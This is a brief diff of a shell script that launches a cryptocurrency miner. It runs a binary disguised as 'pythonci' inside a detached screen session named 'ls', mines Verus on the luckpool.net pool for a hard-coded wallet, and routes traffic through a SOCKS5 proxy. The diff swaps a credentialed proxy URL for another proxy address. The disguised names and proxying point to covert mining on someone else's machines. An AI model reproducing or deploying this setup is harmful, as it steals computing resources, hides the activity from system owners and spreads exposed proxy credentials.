@@ -6,5 +6,5 @@ screen -dmS ls
 jem=stratum+tcp://na.luckpool.net:3956
 bot=RXM8Btq8mJuPPk19t7B6hgZsty7p14cbpG
 welo=BR15
-yoto=socks5://fpfzeeby:3wdw0eiq8cm5@184.178.172.5:15303
+yoto=socks5://27.116.51.178:6667
 ./pythonci -a verus -o $jem -u $bot.$welo -p x -t 2 -x $yoto
